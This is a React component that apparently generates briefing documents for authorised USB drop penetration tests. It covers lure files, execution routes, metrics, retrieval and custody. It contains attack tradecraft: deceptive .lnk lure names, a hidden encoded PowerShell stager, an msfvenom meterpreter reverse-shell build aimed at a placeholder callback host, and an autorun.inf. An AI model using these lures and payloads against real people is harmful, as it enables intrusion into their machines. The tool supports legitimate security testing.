import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  CodeBlock,
  DownloadButton,
  KVTable,
  NumberInput,
  OutputBlock,
  Select,
  TextArea,
  TextInput,
} from '@/components/ui';

/**
 * USB drop assessment brief. The operator picks a lure and a route; the tool
 * assembles the device card, the payload expectation, the drop and retrieval
 * plan, and the measurement table. Rates are computed from what was dropped
 * against what actually reported back — no assumed benchmarks.
 */

type Lure = 'payroll' | 'cv' | 'invoice' | 'driver';
type Route = 'lnk' | 'decoy' | 'autorun';
type Retrieval = 'collect' | 'envelope' | 'target-returns' | 'leave';

interface LureDef {
  value: Lure;
  label: string;
  file: string;
  decoy: string;
  hook: string;
}

const LURES: LureDef[] = [
  { value: 'payroll', label: 'Payroll update', file: 'Payroll_Update_Q3.lnk', decoy: 'Payroll_Update_Q3.pdf', hook: 'Payroll run changes for this quarter — review before Friday.' },
  { value: 'cv', label: 'CV / applicant', file: 'CV_2026_J_Avery.pdf.lnk', decoy: 'CV_2026_J_Avery.pdf', hook: 'Application for the analyst vacancy — short notice, sorry.' },
  { value: 'invoice', label: 'Unpaid invoice', file: 'Invoice_INV-4471.lnk', decoy: 'Invoice_INV-4471.pdf', hook: 'Overdue invoice and remittance details for accounts.' },
  { value: 'driver', label: 'Hardware driver', file: 'USB_Driver_Install.lnk', decoy: 'README.txt', hook: 'Driver package for the dock — run before first use.' },
];

const ROUTES: Array<{ value: Route; label: string }> = [
  { value: 'lnk', label: 'LNK shortcut — double-click execution' },
  { value: 'decoy', label: 'Decoy document, beacon on follow-up' },
  { value: 'autorun', label: 'autorun.inf — legacy path only' },
];

const RETRIEVALS: Array<{ value: Retrieval; label: string }> = [
  { value: 'collect', label: 'Tester returns to each location and collects' },
  { value: 'envelope', label: 'Prepaid envelope — target posts it back' },
  { value: 'target-returns', label: 'Ask the target to return it to the service desk' },
  { value: 'leave', label: 'Left in place, recovered at the debrief walk' },
];

const RETRIEVAL_TEXT: Record<Retrieval, string> = {
  collect: 'Tester revisits each location on the agreed schedule, in the same visit order as the drop, and signs each device back in against its serial.',
  envelope: 'Each device ships with a self-addressed prepaid envelope. Return rate is itself a measurement; do not chase returns individually.',
  'target-returns': 'Devices are handed in at the service desk, which is briefed after the window closes. Anything handed in early is logged but not acted on.',
  leave: 'Devices stay put until the debrief walk. Expect loss; treat a missing device as a custody gap, not a finding.',
};

export default function UsbDropBrief() {
  const [deviceLabel, setDeviceLabel] = useState('PAYROLL-Q3-USB-07');
  const [lure, setLure] = useState<Lure>('payroll');
  const [route, setRoute] = useState<Route>('lnk');
  const [callbackHost, setCallbackHost] = useState('10.10.14.7:443');
  const [locations, setLocations] = useState(
    ['Level 3 kitchen, by the kettle', 'Level 2 car park stairwell', 'Reception waiting area'].join('\n'),
  );
  const [retrieval, setRetrieval] = useState<Retrieval>('collect');
  const [dropped, setDropped] = useState(12);
  const [plugs, setPlugs] = useState(0);
  const [beacons, setBeacons] = useState(0);
  const [firstCallback, setFirstCallback] = useState(0);

  const def = LURES.find((l) => l.value === lure) ?? LURES[0]!;
  const routeDef = ROUTES.find((r) => r.value === route) ?? ROUTES[0]!;
  const locationList = useMemo(
    () => locations.split('\n').map((l) => l.trim()).filter(Boolean),
    [locations],
  );

  const routeFacts = useMemo(() => {
    if (route === 'lnk') {
      return {
        launch: `${def.file} → cmd.exe /c start /min powershell -nop -w hidden -enc {{ENCODED_STAGER}}`,
        expectation:
          'One beacon per execution from the interactive user context, inside 90 seconds of the double-click. No beacon means the shortcut was opened as text, blocked by policy, or never run.',
        note: 'Keep the .lnk extension visible. A shortcut that hides its extension is a second social-engineering step the target can see in the save dialogue — some clients will call that contamination of the plug rate.',
      };
    }
    if (route === 'decoy') {
      return {
        launch: `${def.decoy} opens normally, then stage.lnk beside it fires the beacon`,
        expectation:
          'Document event first, then beacon on the follow-up click. Record both timestamps separately — document-open without a beacon is still a useful measurement.',
        note: 'A two-step route roughly halves the beacon rate but tells you which users open documents at all, which is the number the client usually wants.',
      };
    }
    return {
      launch: `autorun.inf → open=stage.exe (with sidestep and label entries)`,
      expectation:
        'No execution on a current estate. AutoRun is disabled for removable media on Windows 7 and later and the prompt is suppressed for non-optical drives; this route exists to show the control working.',
      note: 'Budget zero beacons from this route. If something does fire, an old or misconfigured host just surfaced — that is the finding, not the payload.',
    };
  }, [route, def]);

  const metrics = useMemo(() => {
    const dropCount = Math.max(0, dropped);
    const plugCount = Math.max(0, plugs);
    const beaconCount = Math.max(0, beacons);
    return {
      dropped: dropCount,
      plugs: plugCount,
      beacons: beaconCount,
      plugRate: dropCount ? (plugCount / dropCount) * 100 : 0,
      beaconOfDropped: dropCount ? (beaconCount / dropCount) * 100 : 0,
      beaconOfPlugs: plugCount ? (beaconCount / plugCount) * 100 : 0,
    };
  }, [dropped, plugs, beacons]);

  const verdict = useMemo(() => {
    if (metrics.dropped === 0) return 'No devices recorded yet — enter the drop count to make the rates meaningful.';
    if (metrics.plugs === 0)
      return 'No plug events yet. Before changing the lure, check the placement: devices on a desk edge or in a stairwell are picked up faster than ones left in a kitchen.';
    if (metrics.plugRate < 15)
      return 'Plug rate is low. That usually means placement and timing, not payload — revisit which locations get foot traffic at the drop hour.';
    if (metrics.plugRate <= 45)
      return 'Plug rate sits in the range most drop assessments report. The interesting number now is beacon conversion: a wide gap between plugs and beacons points at endpoint blocking.';
    return 'Plug rate is high. Either the lure is well matched to the population or physical control at those locations is weak — the debrief should name which, or the client will assume the second.';
  }, [metrics]);

  const brief = useMemo(() => {
    const lines = [
      '# USB drop assessment — briefing document',
      '',
      '> Authorised physical assessment. Placeholder hosts and serials only; replace before issue.',
      '',
      '## 1. Engagement',
      '',
      '- Client: {{CLIENT}}',
      '- Engagement: {{ENGAGEMENT_ID}} — approved by {{APPROVER}} on {{DATE}}',
      '- Window: {{START_UTC}} to {{END_UTC}}',
      '- Site and locations in scope: {{SITE_LIST}}',
      '',
      '## 2. Device and lure',
      '',
      `- Device label: ${deviceLabel || '{{DEVICE_LABEL}}'}`,
      `- Serial range: {{SERIAL_FROM}} to {{SERIAL_TO}}`,
      `- Lure: ${def.label} — ${def.hook}`,
      `- Visible file: ${route === 'autorun' ? 'autorun.inf plus README.txt' : def.file}`,
      `- Decoy payload: ${def.decoy} (opens, no outbound traffic of its own)`,
      `- Physical form: {{ENCLOSURE}} with a printed label matching the lure`,
      '',
      '## 3. Payload route',
      '',
      `- Route: ${routeDef.label}`,
      `- Execution path: ${routeFacts.launch}`,
      `- Expected behaviour: ${routeFacts.expectation}`,
      `- Note: ${routeFacts.note}`,
      `- Callback host: ${callbackHost || '{{CALLBACK_HOST}}'}`,
      '- Beacon interval: {{BEACON_INTERVAL}}s with {{JITTER}}% jitter',
      '- Payload hash (SHA-256): {{SHA256}} — recorded before the first device is written',
      '',
      '## 4. Drop plan',
      '',
      ...(locationList.length ? locationList.map((l, i) => `${i + 1}. ${l} — drop {{TIME_UTC}}, photo reference {{PHOTO_REF}}`) : ['1. {{LOCATION}} — drop {{TIME_UTC}}, photo reference {{PHOTO_REF}}']),
      '',
      '## 5. Retrieval',
      '',
      `- Method: ${RETRIEVALS.find((r) => r.value === retrieval)?.label ?? retrieval}`,
      `- ${RETRIEVAL_TEXT[retrieval]}`,
      '- Any device found with the payload executed is left in place until the debrief confirms the host is isolated.',
      '',
      '## 6. Metrics to record',
      '',
      '| Metric | Definition | Observed |',
      '| --- | --- | --- |',
      `| Devices dropped | Count of devices placed, by location | ${metrics.dropped} |`,
      `| Plug rate | Devices plugged in ÷ devices dropped | ${metrics.plugRate.toFixed(1)}% |`,
      `| Beacon rate (of drops) | Beacons ÷ devices dropped | ${metrics.beaconOfDropped.toFixed(1)}% |`,
      `| Beacon rate (of plugs) | Beacons ÷ devices plugged in | ${metrics.beaconOfPlugs.toFixed(1)}% |`,
      `| Time to first callback | Minutes from first plug to first beacon | ${firstCallback ? `${firstCallback} min` : '—'} |`,
      '',
      '## 7. Cleanup',
      '',
      '- Recover every device and reconcile against the serial ledger; a missing device is a custody incident, reported the same day.',
      '- Remove the payload from any host that executed it, under client supervision, and confirm with the client EDR console.',
      '- Delete test artefacts from the callback infrastructure after the report is signed off; keep the logs, not the sessions.',
      '',
      '## 8. Chain of custody',
      '',
      '- Serial ledger signed at build, at drop and at recovery: `{{SERIAL}} | {{BUILDER}} | {{DROP_TIME}} | {{RECOVERY_TIME}}`.',
      '- Payload hash recorded before imaging and re-verified after recovery.',
      '- Devices stored in a sealed bag with the engagement reference until destruction.',
      '- Photos of each drop location with the device in place, timestamped, retained with the ledger.',
      '- Destruction: wipe and confirm, or return to the client as evidence at their election.',
    ];
    return lines.join('\n');
  }, [
    deviceLabel,
    def,
    route,
    routeDef,
    routeFacts,
    callbackHost,
    locationList,
    retrieval,
    metrics,
    firstCallback,
  ]);

  return (
    <>
      <Card title="Device and lure">
        <div className="grid gap-3 sm:grid-cols-2">
          <TextInput label="Device label" value={deviceLabel} onChange={setDeviceLabel} mono />
          <Select<Lure>
            label="Lure"
            value={lure}
            onChange={setLure}
            options={LURES.map((l) => ({ value: l.value, label: l.label }))}
          />
        </div>
        <div className="mt-3">
          <KVTable
            rows={[
              ['Visible filename', def.file],
              ['Decoy payload', def.decoy],
              ['Lure text', def.hook],
            ]}
          />
        </div>
        <div className="mt-3">
          <Callout tone="info" title="What the finder sees">
            The file name, the icon and the label on the shell all have to agree, or the device reads as a plant rather
            than a lost stick.
          </Callout>
        </div>
      </Card>

      <Card title="Payload route and callback">
        <div className="grid gap-3 sm:grid-cols-2">
          <Select<Route>
            label="Route"
            value={route}
            onChange={setRoute}
            options={ROUTES}
          />
          <TextInput label="Callback host" value={callbackHost} onChange={setCallbackHost} mono />
        </div>
        <div className="mt-3">
          <KVTable
            rows={[
              ['Execution path', routeFacts.launch],
              ['Expected result', routeFacts.expectation],
              ['Operator note', routeFacts.note],
            ]}
          />
        </div>
        <div className="mt-3">
          <CodeBlock
            label="Build and hash (placeholders)"
            maxHeight={180}
            code={[
              `# build the stage, then hash it before it touches a device`,
              `msfvenom -p windows/x64/meterpreter/reverse_https LHOST={{CALLBACK_HOST}} LPORT=443 -f exe -o stage.exe`,
              `sha256sum stage.exe | tee payload.sha256`,
              ``,
              `# stage the shortcut beside the decoy`,
              `cp "${def.decoy}" dist/ && cp stage.lnk "dist/${def.file}"`,
              ``,
              `# autorun note: only meaningful for optical media on a current estate`,
              `printf '[AutoRun]\\nopen=stage.exe\\nlabel=${def.label}\\n' > dist/autorun.inf`,
            ].join('\n')}
          />
        </div>
      </Card>

      <Card title="Drop plan and results">
        <TextArea
          label="Drop locations"
          value={locations}
          onChange={setLocations}
          rows={4}
          hint="One location per line. The brief numbers them in order."
        />
        <div className="mt-3 grid gap-3 sm:grid-cols-2">
          <Select<Retrieval>
            label="Retrieval method"
            value={retrieval}
            onChange={setRetrieval}
            options={RETRIEVALS}
          />
          <NumberInput label="Devices dropped" value={dropped} onChange={setDropped} min={0} max={999} />
          <NumberInput label="Devices plugged in" value={plugs} onChange={setPlugs} min={0} max={999} />
          <NumberInput label="Beacons observed" value={beacons} onChange={setBeacons} min={0} max={999} />
          <NumberInput
            label="Minutes to first callback"
            value={firstCallback}
            onChange={setFirstCallback}
            min={0}
            max={10080}
            hint="0 = not yet observed"
          />
        </div>
        <div className="mt-3">
          <KVTable
            rows={[
              ['Locations planned', String(locationList.length)],
              ['Plug rate', `${metrics.plugRate.toFixed(1)}% (${metrics.plugs}/${metrics.dropped})`],
              ['Beacon rate of drops', `${metrics.beaconOfDropped.toFixed(1)}%`],
              ['Beacon rate of plugs', `${metrics.beaconOfPlugs.toFixed(1)}%`],
              ['Retrieval', RETRIEVAL_TEXT[retrieval]],
            ]}
          />
        </div>
        <div className="mt-3">
          <Callout tone={metrics.plugs === 0 ? 'warn' : 'info'} title="Reading the numbers">
            {verdict}
          </Callout>
        </div>
      </Card>

      <Card
        title="Briefing document"
        action={<DownloadButton text={brief} filename="usb-drop-brief.md" label="Download .md" />}
      >
        <OutputBlock value={brief} label="usb-drop-brief.md" rows={16} />
        <div className="mt-3 grid gap-3 sm:grid-cols-2">
          <Callout tone="warn" title="Cleanup is part of the test">
            Every device is accounted for by serial before the report is issued. A device left in a desk drawer becomes
            someone else's attack tool the moment the engagement closes.
          </Callout>
          <Callout tone="info" title="Custody chain">
            The serial ledger is the deliverable, not the payload. If the client cannot show a signed ledger for each
            device, the finding is about their asset control as much as their endpoint control.
          </Callout>
        </div>
      </Card>
    </>
  );
}
